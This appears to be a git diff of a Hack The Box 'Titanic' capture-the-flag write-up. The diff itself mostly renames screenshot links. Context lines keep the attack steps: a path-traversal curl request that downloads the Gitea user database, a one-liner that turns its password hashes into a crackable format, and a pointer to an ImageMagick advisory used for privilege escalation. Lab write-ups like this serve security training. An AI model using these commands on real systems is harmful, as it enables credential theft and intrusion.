@@ -65,31 +65,31 @@ echo "10.10.11.55 dev.titanic.htb" | sudo tee -a /etc/hosts
 ```
 
 ## titanic.htb
-![[/static/titanic/Pasted image 20250215232402.png]]
+![[/static/titanic/20250215232402.png]]
 
-![[/static/titanic/Pasted image 20250215232412.png]]
+![[/static/titanic/20250215232412.png]]
 
-![[/static/titanic/Pasted image 20250215232428.png]]
+![[/static/titanic/20250215232428.png]]
 
-![[/static/titanic/Pasted image 20250215232451.png]]
+![[/static/titanic/20250215232451.png]]
 
-![[/static/titanic/Pasted image 20250215232508.png]]
-![[/static/titanic/Pasted image 20250215232534.png]]
+![[/static/titanic/20250215232508.png]]
+![[/static/titanic/20250215232534.png]]
 
 ## dev.titanic.htb
-![[/static/titanic/Pasted image 20250215232227.png]]
+![[/static/titanic/20250215232227.png]]
 
-![[/static/titanic/Pasted image 20250215232256.png]]
+![[/static/titanic/20250215232256.png]]
 
-![[/static/titanic/Pasted image 20250215232633.png]]
+![[/static/titanic/20250215232633.png]]
 
-![[/static/titanic/Pasted image 20250215232731.png]]
+![[/static/titanic/20250215232731.png]]
 
 ```bash
 curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -o db.db
 ```
 
-![[/static/titanic/Pasted image 20250215232847.png]]
+![[/static/titanic/20250215232847.png]]
 
 ```bash
 sqlite3 db.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
@@ -118,7 +118,7 @@ find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magic
 
 https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8
 
-![[/static/titanic/Pasted image 20250215233607.png]]
+![[/static/titanic/20250215233607.png]]
 
 ```bash
 cd /opt/app/static/assets/images
